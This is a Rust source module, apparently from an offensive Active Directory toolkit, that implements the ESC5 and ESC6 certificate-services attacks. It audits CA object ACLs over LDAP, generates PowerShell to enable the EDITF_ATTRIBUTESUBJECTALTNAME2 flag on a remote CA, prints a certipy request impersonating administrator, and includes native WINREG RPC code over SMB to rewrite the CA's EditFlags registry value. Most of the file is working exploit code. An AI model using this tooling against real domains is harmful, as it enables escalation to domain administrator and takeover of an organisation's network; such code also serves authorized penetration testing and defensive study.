//! ESC5 — Vulnerable PKI Object Access Control
//!
//! ESC5 targets **weak ACLs on PKI objects** in AD (not templates — that's ESC4).
//! Specifically, if an attacker has WriteDacl/WriteOwner on:
//!
//!   - CA object in CN=Enrollment Services
//!   - NTAuthCertificates object
//!   - PKI container itself
//!
//! they can escalate by modifying CA security descriptors, adding rogue CAs,
//! or enabling vulnerable configurations.
//!
//! This module also implements ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2) since
//! ESC6 requires registry modification on the CA server, which ESC5 ACL abuse
//! may grant access to.
//!
//! Reference: SpecterOps "Certified Pre-Owned" — ESC5, ESC6

use crate::error::{OverthroneError, Result};
use crate::proto::ldap::LdapSession;
use crate::proto::smb::SmbSession;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
// Constants
// ═══════════════════════════════════════════════════════════

/// EDITF_ATTRIBUTESUBJECTALTNAME2 flag (ESC6)
const EDITF_ATTRIBUTESUBJECTALTNAME2: u32 = 0x00040000;

/// EDITF_ATTRIBUTEENDDATE flag (ESC5 validity abuse)
const EDITF_ATTRIBUTEENDDATE: u32 = 0x00100000;

/// Registry path template for CA policy module EditFlags
const EDITFLAGS_REG_PATH: &str = r"SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\{CA_NAME}\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy";

// ═══════════════════════════════════════════════════════════
// ESC5 — PKI Object ACL Abuse (LDAP-based)
// ═══════════════════════════════════════════════════════════

/// Target for ESC5 PKI object ACL abuse
pub struct Esc5Target {
    pub ca_name: String,
    pub ca_server: String,
    pub domain: String,
    pub current_user: String,
}

impl Esc5Target {
    pub fn new(
        ca_name: impl Into<String>,
        ca_server: impl Into<String>,
        domain: impl Into<String>,
        current_user: impl Into<String>,
    ) -> Self {
        Self {
            ca_name: ca_name.into(),
            ca_server: ca_server.into(),
            domain: domain.into(),
            current_user: current_user.into(),
        }
    }

    /// Check if the CA enrollment service has weak ACLs via LDAP.
    ///
    /// Reads the nTSecurityDescriptor of the enrollment service object
    /// and checks for overly permissive entries (Everyone, Authenticated Users,
    /// Domain Users, Domain Computers having write access).
    pub async fn check_ca_acls(
        &self,
        ldap: &mut LdapSession,
        base_dn: &str,
    ) -> Result<Esc5AclResult> {
        info!(
            "Checking CA '{}' ACLs for ESC5 vulnerabilities",
            self.ca_name
        );

        let filter = format!("(&(objectClass=pKIEnrollmentService)(cn={}))", self.ca_name);
        let config_nc = format!("CN=Configuration,{}", base_dn);

        let entries = ldap
            .custom_search_with_base(
                &config_nc,
                &filter,
                &["cn", "nTSecurityDescriptor", "distinguishedName"],
            )
            .await?;

        if entries.is_empty() {
            return Err(OverthroneError::Ldap {
                target: self.ca_name.clone(),
                reason: "CA enrollment service not found in LDAP".to_string(),
            });
        }

        let entry = &entries[0];
        let sd = entry
            .attrs
            .get("nTSecurityDescriptor")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_default();
        let dn = entry.dn.clone();

        // Well-known SIDs that indicate weak ACLs
        let weak_sids = [
            ("S-1-1-0", "Everyone"),
            ("S-1-5-11", "Authenticated Users"),
            ("S-1-5-7", "Anonymous Logon"),
        ];

        let mut findings = Vec::new();
        for (sid, name) in &weak_sids {
            if sd.contains(sid) {
                findings.push(format!("{} ({}) has permissions on CA object", name, sid));
            }
        }

        // Check for Domain Users / Domain Computers (SID ending in -513 / -515)
        if sd.contains("-513") {
            findings.push("Domain Users (RID 513) has permissions on CA object".to_string());
        }
        if sd.contains("-515") {
            findings.push("Domain Computers (RID 515) has permissions on CA object".to_string());
        }

        let vulnerable = !findings.is_empty();

        Ok(Esc5AclResult {
            ca_name: self.ca_name.clone(),
            ca_dn: dn,
            vulnerable,
            findings,
            security_descriptor_raw: sd,
        })
    }

    /// Check NTAuthCertificates object ACLs.
    ///
    /// If an attacker can write to NTAuthCertificates, they can add a rogue CA
    /// certificate and have certificates issued by their CA trusted for domain auth.
    pub async fn check_ntauth_acls(
        &self,
        ldap: &mut LdapSession,
        base_dn: &str,
    ) -> Result<Esc5AclResult> {
        info!("Checking NTAuthCertificates ACLs for ESC5");

        let config_nc = format!("CN=Configuration,{}", base_dn);
        let filter = "(cn=NTAuthCertificates)";

        let entries = ldap
            .custom_search_with_base(
                &config_nc,
                filter,
                &["cn", "nTSecurityDescriptor", "distinguishedName"],
            )
            .await?;

        if entries.is_empty() {
            return Err(OverthroneError::Ldap {
                target: "NTAuthCertificates".to_string(),
                reason: "NTAuthCertificates object not found".to_string(),
            });
        }

        let entry = &entries[0];
        let sd = entry
            .attrs
            .get("nTSecurityDescriptor")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_default();
        let dn = entry.dn.clone();

        let weak_sids = [("S-1-1-0", "Everyone"), ("S-1-5-11", "Authenticated Users")];

        let mut findings = Vec::new();
        for (sid, name) in &weak_sids {
            if sd.contains(sid) {
                findings.push(format!(
                    "{} ({}) has permissions on NTAuthCertificates",
                    name, sid
                ));
            }
        }
        if sd.contains("-513") {
            findings
                .push("Domain Users (RID 513) has permissions on NTAuthCertificates".to_string());
        }

        let vulnerable = !findings.is_empty();

        Ok(Esc5AclResult {
            ca_name: "NTAuthCertificates".to_string(),
            ca_dn: dn,
            vulnerable,
            findings,
            security_descriptor_raw: sd,
        })
    }

    // ─────────────────────────────────────────────────────────
    // ESC6 — Registry flag commands (command generation)
    // ─────────────────────────────────────────────────────────

    /// Get the registry path for EditFlags
    fn reg_path(&self) -> String {
        EDITFLAGS_REG_PATH.replace("{CA_NAME}", &self.ca_name)
    }

    /// Generate PowerShell command to READ EditFlags
    pub fn generate_read_editflags_command(&self) -> String {
        format!(
            "# Read EditFlags for CA '{}' on '{}'  (ESC6 check)\n\
             Invoke-Command -ComputerName '{}' -ScriptBlock {{\n\
               $path = \"HKLM:\\\\{}\" \n\
               $flags = (Get-ItemProperty -Path $path -Name EditFlags).EditFlags\n\
               Write-Host \"EditFlags = $flags (0x$($flags.ToString('X8')))\"\n\
               if ($flags -band 0x{:08X}) {{ Write-Host '[!] EDITF_ATTRIBUTESUBJECTALTNAME2 is ENABLED (ESC6!)' }}\n\
               if ($flags -band 0x{:08X}) {{ Write-Host '[!] EDITF_ATTRIBUTEENDDATE is ENABLED' }}\n\
             }}",
            self.ca_name,
            self.ca_server,
            self.ca_server,
            self.reg_path().replace('\\', "\\\\"),
            EDITF_ATTRIBUTESUBJECTALTNAME2,
            EDITF_ATTRIBUTEENDDATE,
        )
    }

    /// Generate PowerShell command to ENABLE EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6)
    pub fn generate_enable_san_command(&self) -> String {
        format!(
            "# Enable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA '{}' (ESC6)\n\
             Invoke-Command -ComputerName '{}' -ScriptBlock {{\n\
               $path = \"HKLM:\\\\{}\"\n\
               $flags = (Get-ItemProperty -Path $path -Name EditFlags).EditFlags\n\
               $new = $flags -bor 0x{:08X}\n\
               Set-ItemProperty -Path $path -Name EditFlags -Value $new\n\
               Restart-Service CertSvc -Force\n\
               Write-Host \"[+] SAN flag enabled. EditFlags: $flags -> $new\"\n\
             }}\n\n\
             # Certipy equivalent:\n\
             # certipy ca -ca '{}' -target '{}' -enable-flag EDITF_ATTRIBUTESUBJECTALTNAME2",
            self.ca_name,
            self.ca_server,
            self.reg_path().replace('\\', "\\\\"),
            EDITF_ATTRIBUTESUBJECTALTNAME2,
            self.ca_name,
            self.ca_server,
        )
    }

    /// Generate PowerShell command to RESTORE (disable) EDITF_ATTRIBUTESUBJECTALTNAME2
    pub fn generate_restore_san_command(&self) -> String {
        format!(
            "# Disable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA '{}' (Restore)\n\
             Invoke-Command -ComputerName '{}' -ScriptBlock {{\n\
               $path = \"HKLM:\\\\{}\"\n\
               $flags = (Get-ItemProperty -Path $path -Name EditFlags).EditFlags\n\
               $new = $flags -band (-bnot 0x{:08X})\n\
               Set-ItemProperty -Path $path -Name EditFlags -Value $new\n\
               Restart-Service CertSvc -Force\n\
               Write-Host \"[+] SAN flag disabled. EditFlags: $flags -> $new\"\n\
             }}",
            self.ca_name,
            self.ca_server,
            self.reg_path().replace('\\', "\\\\"),
            EDITF_ATTRIBUTESUBJECTALTNAME2,
        )
    }

    /// Generate full ESC5 + ESC6 exploit command set
    pub fn generate_exploit_commands(&self) -> Result<String> {
        info!(
            "Generating ESC5/ESC6 exploit commands for CA: {}",
            self.ca_name
        );

        Ok(format!(
            "╔═══════════════════════════════════════════════╗\n\
             ║          ESC5/ESC6 — CA Configuration          ║\n\
             ╚═══════════════════════════════════════════════╝\n\n\
             CA: {ca}\n\
             Server: {server}\n\
             Attacker: {user}\n\n\
             ── Step 1: Check current EditFlags ────────────\n\
             {read}\n\n\
             ── Step 2: Enable SAN flag (ESC6) ─────────────\n\
             {enable}\n\n\
             ── Step 3: Request cert with arbitrary SAN ────\n\
             certipy req -u '{user}@{domain}' -p 'PASSWORD' \\\n\
               -ca '{ca}' -target '{server}' \\\n\
               -template User -upn administrator@{domain}\n\n\
             ── Restore ────────────────────────────────────\n\
             {restore}\n",
            ca = self.ca_name,
            server = self.ca_server,
            user = self.current_user,
            domain = self.domain,
            read = self.generate_read_editflags_command(),
            enable = self.generate_enable_san_command(),
            restore = self.generate_restore_san_command(),
        ))
    }
}

// ═══════════════════════════════════════════════════════════
// Result types
// ═══════════════════════════════════════════════════════════

/// Result of ESC5 ACL check
#[derive(Debug, Clone)]
pub struct Esc5AclResult {
    pub ca_name: String,
    pub ca_dn: String,
    pub vulnerable: bool,
    pub findings: Vec<String>,
    pub security_descriptor_raw: String,
}

impl std::fmt::Display for Esc5AclResult {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        if self.vulnerable {
            writeln!(f, "[!] ESC5 VULNERABLE: {} ({})", self.ca_name, self.ca_dn)?;
            for finding in &self.findings {
                writeln!(f, "    → {}", finding)?;
            }
        } else {
            writeln!(f, "[✓] {} — No weak ACLs detected", self.ca_name)?;
        }
        Ok(())
    }
}

// ═══════════════════════════════════════════════════════════
// ESC6 — Native WINREG RPC (MS-RRP over SMB \pipe\winreg)
// ═══════════════════════════════════════════════════════════

/// Read the `EditFlags` DWORD from the CA policy module registry key via
/// native WINREG RPC (MS-RRP protocol over SMB `\pipe\winreg`).
///
/// Caller must have already connected `smb` to the CA server.
///
/// Flow: Bind → OpenLocalMachine → OpenKey(policy_path) →
///       QueryValue("EditFlags") → CloseKey × 2
pub async fn read_editflags_rpc(smb: &SmbSession, reg_path: &str) -> Result<u32> {
    info!("WINREG: reading EditFlags from '{}'", reg_path);

    // ── Bind to MS-RRP ────────────────────────────────────
    let bind  = winreg_bind_pdu();
    let bresp = smb.pipe_transact("winreg", &bind).await?;
    if bresp.len() < 4 || bresp[2] != 12 {
        return Err(OverthroneError::Rpc {
            target: "winreg".into(),
            reason: "WINREG bind rejected".into(),
        });
    }

    // ── OpenLocalMachine ──────────────────────────────────
    const KEY_READ: u32 = 0x0002_0019;
    let olm_req  = winreg_open_local_machine(KEY_READ);
    let olm_resp = smb.pipe_transact("winreg", &olm_req).await?;
    let hive     = parse_rrpchandle(&olm_resp).ok_or_else(|| OverthroneError::Rpc {
        target: "winreg".into(),
        reason: "OpenLocalMachine returned unexpected handle".into(),
    })?;

    // ── OpenKey(reg_path) ──────────────────────────────────
    let ok_req  = winreg_open_key(&hive, reg_path, KEY_READ);
    let ok_resp = smb.pipe_transact("winreg", &ok_req).await?;
    let key     = parse_rrpchandle(&ok_resp).ok_or_else(|| OverthroneError::Rpc {
        target: "winreg".into(),
        reason: format!("OpenKey('{}') failed", reg_path),
    })?;

    // ── QueryValue("EditFlags") ───────────────────────────
    let qv_req  = winreg_query_value(&key, "EditFlags");
    let qv_resp = smb.pipe_transact("winreg", &qv_req).await?;
    let flags   = parse_query_dword(&qv_resp).ok_or_else(|| OverthroneError::Rpc {
        target: "winreg".into(),
        reason: "Could not parse EditFlags DWORD from QueryValue response".into(),
    })?;

    // ── CloseKey (best-effort) ────────────────────────────
    let _ = smb.pipe_transact("winreg", &winreg_close_key(&key)).await;
    let _ = smb.pipe_transact("winreg", &winreg_close_key(&hive)).await;

    info!("WINREG: EditFlags = 0x{:08X}", flags);
    Ok(flags)
}

/// Write a new `EditFlags` DWORD to the CA policy module registry key via WINREG RPC.
///
/// To enable ESC6, OR in `EDITF_ATTRIBUTESUBJECTALTNAME2`.
/// To restore, AND NOT the same flag.
pub async fn set_editflags_rpc(smb: &SmbSession, reg_path: &str, new_flags: u32) -> Result<()> {
    warn!(
        "WINREG: writing EditFlags = 0x{:08X} to '{}'",
        new_flags, reg_path
    );

    // ── Bind ──────────────────────────────────────────────
    let bind  = winreg_bind_pdu();
    let bresp = smb.pipe_transact("winreg", &bind).await?;
    if bresp.len() < 4 || bresp[2] != 12 {
        return Err(OverthroneError::Rpc {
            target: "winreg".into(),
            reason: "WINREG bind rejected".into(),
        });
    }

    // ── OpenLocalMachine ──────────────────────────────────
    const KEY_ALL_ACCESS: u32 = 0x0002_003F;
    let olm_req  = winreg_open_local_machine(KEY_ALL_ACCESS);
    let olm_resp = smb.pipe_transact("winreg", &olm_req).await?;
    let hive     = parse_rrpchandle(&olm_resp).ok_or_else(|| OverthroneError::Rpc {
        target: "winreg".into(),
        reason: "OpenLocalMachine returned invalid handle".into(),
    })?;

    // ── OpenKey ───────────────────────────────────────────
    let ok_req  = winreg_open_key(&hive, reg_path, KEY_ALL_ACCESS);
    let ok_resp = smb.pipe_transact("winreg", &ok_req).await?;
    let key     = parse_rrpchandle(&ok_resp).ok_or_else(|| OverthroneError::Rpc {
        target: "winreg".into(),
        reason: format!("OpenKey('{}') failed", reg_path),
    })?;

    // ── SetValue ──────────────────────────────────────────
    const REG_DWORD: u32 = 4;
    let sv_req  = winreg_set_value(&key, "EditFlags", REG_DWORD, &new_flags.to_le_bytes());
    let sv_resp = smb.pipe_transact("winreg", &sv_req).await?;
    let rc      = winreg_return_code(&sv_resp);
    if rc != 0 {
        return Err(OverthroneError::Rpc {
            target: "winreg".into(),
            reason: format!("SetValue('EditFlags') failed: WIN32 error 0x{:08X}", rc),
        });
    }

    // ── CloseKey ──────────────────────────────────────────
    let _ = smb.pipe_transact("winreg", &winreg_close_key(&key)).await;
    let _ = smb.pipe_transact("winreg", &winreg_close_key(&hive)).await;

    info!("WINREG: EditFlags updated successfully");
    Ok(())
}

// ─────────────────────────────────────────────────────────────
// WINREG NDR helpers (MS-RRP)
// ─────────────────────────────────────────────────────────────

/// Build DCE/RPC BIND PDU for MS-RRP (UUID 338cd001-2244-31f1-aaaa-900038001003 v1.0).
fn winreg_bind_pdu() -> Vec<u8> {
    // MS-RRP UUID (little-endian field encoding)
    let uuid: [u8; 16] = [
        0x01, 0xd0, 0x8c, 0x33, 0x44, 0x22, 0xf1, 0x31,
        0xaa, 0xaa, 0x90, 0x00, 0x38, 0x00, 0x10, 0x03,
    ];
    let mut b = Vec::with_capacity(72);
    b.extend_from_slice(&[5, 0, 11, 3]);            // v5.0, bind
    b.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR
    b.extend_from_slice(&72u16.to_le_bytes());       // frag_len
    b.extend_from_slice(&0u16.to_le_bytes());        // auth_len
    b.extend_from_slice(&3u32.to_le_bytes());        // call_id (3 avoids SAMR/SRVSVC)
    b.extend_from_slice(&4096u16.to_le_bytes());
    b.extend_from_slice(&4096u16.to_le_bytes());
    b.extend_from_slice(&0u32.to_le_bytes());        // assoc_group
    b.push(1); b.extend_from_slice(&[0, 0, 0]);     // 1 ctx item
    b.extend_from_slice(&0u16.to_le_bytes());        // context_id
    b.push(1); b.push(0);
    b.extend_from_slice(&uuid);
    b.extend_from_slice(&1u16.to_le_bytes());        // if version major
    b.extend_from_slice(&0u16.to_le_bytes());        // if version minor
    // NDR transfer syntax
    b.extend_from_slice(&[
        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
        0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
    ]);
    b.extend_from_slice(&2u32.to_le_bytes());
    b
}

/// WINREG OpenLocalMachine (opnum 2).
fn winreg_open_local_machine(sam_desired: u32) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&0u32.to_le_bytes()); // MachineName = NULL
    stub.extend_from_slice(&sam_desired.to_le_bytes());
    winreg_req(2, &stub)
}

/// WINREG OpenKey (opnum 15).
fn winreg_open_key(hkey: &[u8; 20], subkey: &str, sam_desired: u32) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(hkey);
    // SubKey as RPC_UNICODE_STRING (Length, MaximumLength, Buffer ptr)
    append_rpc_unicode_string(&mut stub, subkey);
    stub.extend_from_slice(&0u32.to_le_bytes()); // Options = 0
    stub.extend_from_slice(&sam_desired.to_le_bytes());
    winreg_req(15, &stub)
}

/// WINREG QueryValue (opnum 17) — requests up to 512 bytes of data.
fn winreg_query_value(hkey: &[u8; 20], value_name: &str) -> Vec<u8> {
    const MAX_DATA: u32 = 512;
    let mut stub = Vec::new();
    stub.extend_from_slice(hkey);
    append_rpc_unicode_string(&mut stub, value_name);
    // lpType: non-null unique ptr, deferred DWORD = 0
    stub.extend_from_slice(&0x0002_0020u32.to_le_bytes()); // referent
    // lpData: non-null, size_is(*lpcbData) = MAX_DATA bytes
    stub.extend_from_slice(&0x0002_0024u32.to_le_bytes()); // referent
    // lpcbData: non-null unique ptr, deferred DWORD = MAX_DATA
    stub.extend_from_slice(&0x0002_0028u32.to_le_bytes()); // referent
    // pcbLen: non-null unique ptr, deferred DWORD = 0
    stub.extend_from_slice(&0x0002_002Cu32.to_le_bytes()); // referent
    // ── Deferred values ───────────────────────────────────
    // lpType deferred: DWORD = 0
    stub.extend_from_slice(&0u32.to_le_bytes());
    // lpData deferred: conformant array (max_count + MAX_DATA bytes)
    stub.extend_from_slice(&MAX_DATA.to_le_bytes());
    stub.extend_from_slice(&vec![0u8; MAX_DATA as usize]);
    // lpcbData deferred: DWORD = MAX_DATA
    stub.extend_from_slice(&MAX_DATA.to_le_bytes());
    // pcbLen deferred: DWORD = 0
    stub.extend_from_slice(&0u32.to_le_bytes());
    winreg_req(17, &stub)
}

/// WINREG SetValue (opnum 22).
fn winreg_set_value(hkey: &[u8; 20], value_name: &str, reg_type: u32, data: &[u8]) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(hkey);
    append_rpc_unicode_string(&mut stub, value_name);
    stub.extend_from_slice(&reg_type.to_le_bytes());
    // [in] lpData: conformant array
    stub.extend_from_slice(&(data.len() as u32).to_le_bytes());
    stub.extend_from_slice(data);
    while stub.len() % 4 != 0 { stub.push(0); }
    // cbData
    stub.extend_from_slice(&(data.len() as u32).to_le_bytes());
    winreg_req(22, &stub)
}

/// WINREG CloseKey (opnum 5).
fn winreg_close_key(hkey: &[u8; 20]) -> Vec<u8> {
    winreg_req(5, hkey)
}

/// Append an `RPC_UNICODE_STRING` for `s` (inline Length/MaxLength/ptr + deferred array).
fn append_rpc_unicode_string(buf: &mut Vec<u8>, s: &str) {
    let utf16: Vec<u8> = s.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let byte_len = utf16.len() as u16;
    buf.extend_from_slice(&byte_len.to_le_bytes());           // Length
    buf.extend_from_slice(&(byte_len + 2).to_le_bytes());     // MaximumLength (include null)
    buf.extend_from_slice(&0x0002_0010u32.to_le_bytes());     // Buffer referent
    // Deferred: max_count, offset, actual_count, data, null
    let char_count = (byte_len / 2) as u32;
    buf.extend_from_slice(&(char_count + 1).to_le_bytes());   // max_count
    buf.extend_from_slice(&0u32.to_le_bytes());               // offset
    buf.extend_from_slice(&char_count.to_le_bytes());         // actual_count
    buf.extend_from_slice(&utf16);
    buf.extend_from_slice(&[0x00, 0x00]);                     // null terminator
    while buf.len() % 4 != 0 { buf.push(0); }
}

/// Build a DCE/RPC Request PDU for the WINREG interface.
fn winreg_req(opnum: u16, stub: &[u8]) -> Vec<u8> {
    let frag_len = (24 + stub.len()) as u16;
    let mut pdu = vec![5, 0, 0, 0x03];              // v5.0, Request, first+last
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);// NDR
    pdu.extend_from_slice(&frag_len.to_le_bytes());  // frag_len
    pdu.extend_from_slice(&0u16.to_le_bytes());      // auth_len
    pdu.extend_from_slice(&3u32.to_le_bytes());      // call_id
    pdu.extend_from_slice(&(stub.len() as u32).to_le_bytes()); // alloc_hint
    pdu.extend_from_slice(&0u16.to_le_bytes());      // context_id
    pdu.extend_from_slice(&opnum.to_le_bytes());
    pdu.extend_from_slice(stub);
    pdu
}

/// Extract the 20-byte RRPCHANDLE from OpenLocalMachine / OpenKey response.
/// Layout: [24 RPC hdr] [stub: 20-byte handle | 4-byte return code]
fn parse_rrpchandle(resp: &[u8]) -> Option<[u8; 20]> {
    const HDR: usize = 24;
    if resp.len() < HDR + 24 {
        debug!("WINREG: short response for handle ({} bytes)", resp.len());
        return None;
    }
    let rc = u32::from_le_bytes([resp[HDR+20], resp[HDR+21], resp[HDR+22], resp[HDR+23]]);
    if rc != 0 {
        debug!("WINREG: OpenKey/OpenLocalMachine failed: WIN32 0x{:08X}", rc);
        return None;
    }
    let mut h = [0u8; 20];
    h.copy_from_slice(&resp[HDR..HDR+20]);
    Some(h)
}

/// Extract the DWORD value from a QueryValue response stub.
/// The DWORD data appears after the handle, type, conformant size markers.
fn parse_query_dword(resp: &[u8]) -> Option<u32> {
    // Stub: lpType(4) + max_count(4) + data[...] + lpcbData(4) + pcbLen(4) + rc(4)
    // We just scan for the data — it's at the known offset after the header.
    const HDR: usize = 24;
    if resp.len() < HDR + 20 {
        return None;
    }
    let stub = &resp[HDR..];
    // Return code is at the *end* of the stub
    let rc = u32::from_le_bytes([
        stub[stub.len()-4], stub[stub.len()-3],
        stub[stub.len()-2], stub[stub.len()-1],
    ]);
    if rc != 0 {
        debug!("WINREG: QueryValue failed: WIN32 0x{:08X}", rc);
        return None;
    }
    // lpType at [0], max_count at [4], data at [8]
    if stub.len() < 12 {
        return None;
    }
    let _lp_type   = u32::from_le_bytes([stub[0], stub[1], stub[2], stub[3]]);
    let _max_count = u32::from_le_bytes([stub[4], stub[5], stub[6], stub[7]]);
    if stub.len() < 12 {
        return None;
    }
    Some(u32::from_le_bytes([stub[8], stub[9], stub[10], stub[11]]))
}

/// Extract the Windows error code from the last 4 bytes of a WINREG response stub.
fn winreg_return_code(resp: &[u8]) -> u32 {
    const HDR: usize = 24;
    if resp.len() < HDR + 4 {
        return 1; // non-zero = error
    }
    let off = resp.len() - 4;
    u32::from_le_bytes([resp[off], resp[off+1], resp[off+2], resp[off+3]])
}

// ═══════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_esc5_target_creation() {
        let target = Esc5Target::new("CorpCA", "ca.corp.local", "corp.local", "attacker");
        assert_eq!(target.ca_name, "CorpCA");
        assert_eq!(target.ca_server, "ca.corp.local");
    }

    #[test]
    fn test_read_command_generation() {
        let target = Esc5Target::new("CorpCA", "ca.corp.local", "corp.local", "attacker");
        let cmd = target.generate_read_editflags_command();
        assert!(cmd.contains("CorpCA"));
        assert!(cmd.contains("ca.corp.local"));
        assert!(cmd.contains("EditFlags"));
        assert!(cmd.contains("00040000")); // SAN flag
    }

    #[test]
    fn test_enable_san_command() {
        let target = Esc5Target::new("CorpCA", "ca.corp.local", "corp.local", "attacker");
        let cmd = target.generate_enable_san_command();
        assert!(cmd.contains("-bor"));
        assert!(cmd.contains("Restart-Service"));
        assert!(cmd.contains("certipy"));
    }

    #[test]
    fn test_restore_san_command() {
        let target = Esc5Target::new("CorpCA", "ca.corp.local", "corp.local", "attacker");
        let cmd = target.generate_restore_san_command();
        assert!(cmd.contains("-bnot"));
        assert!(cmd.contains("Restart-Service"));
    }

    #[test]
    fn test_editflag_constants() {
        assert_eq!(EDITF_ATTRIBUTESUBJECTALTNAME2, 0x00040000);
        assert_eq!(EDITF_ATTRIBUTEENDDATE, 0x00100000);
        // Verify they don't overlap
        assert_eq!(EDITF_ATTRIBUTESUBJECTALTNAME2 & EDITF_ATTRIBUTEENDDATE, 0);
    }

    #[test]
    fn test_exploit_commands() {
        let target = Esc5Target::new("CorpCA", "ca.corp.local", "corp.local", "attacker");
        let cmds = target.generate_exploit_commands().unwrap();
        assert!(cmds.contains("ESC5/ESC6"));
        assert!(cmds.contains("administrator@corp.local"));
        assert!(cmds.contains("Restore"));
    }
}
